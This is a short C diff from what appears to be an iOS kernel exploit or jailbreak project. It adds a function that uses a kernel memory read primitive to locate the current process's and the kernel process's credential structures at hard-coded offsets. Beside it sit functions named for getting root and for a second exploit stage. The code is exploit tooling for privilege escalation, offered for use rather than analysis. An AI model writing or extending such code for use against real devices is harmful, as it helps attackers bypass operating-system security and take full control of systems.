@@ -127,6 +127,23 @@ void mineek_getRoot(uint64_t proc_addr)
     printf("[i] getuid: %d\n", getuid());
 }
 
+uint64_t find_ucred(uint64_t proc_addr){
+    uint64_t self_ro = kread64(proc_addr + 0x20);
+    printf("[i] self_ro: 0x%llx\n", self_ro);
+    uint64_t self_ucred = kread64(self_ro + 0x20);
+    printf("[i] ucred: 0x%llx\n", self_ucred);
+    printf("[i] test_uid = %d\n", getuid());
+
+    uint64_t kernproc = get_kernproc();
+    printf("[i] kern proc: %llx\n", kernproc);
+    uint64_t kern_ro = kread64(kernproc + 0x20);
+    printf("[i] kern_ro: 0x%llx\n", kern_ro);
+    uint64_t kern_ucred = kread64(kern_ro + 0x20);
+    printf("[i] kern_ucred: 0x%llx\n", kern_ucred);
+    return kern_ucred;
+}
+
+
 void stage2(void) {
     pid_t pid = getpid();
     printf("[i] pid = %d\n", pid);
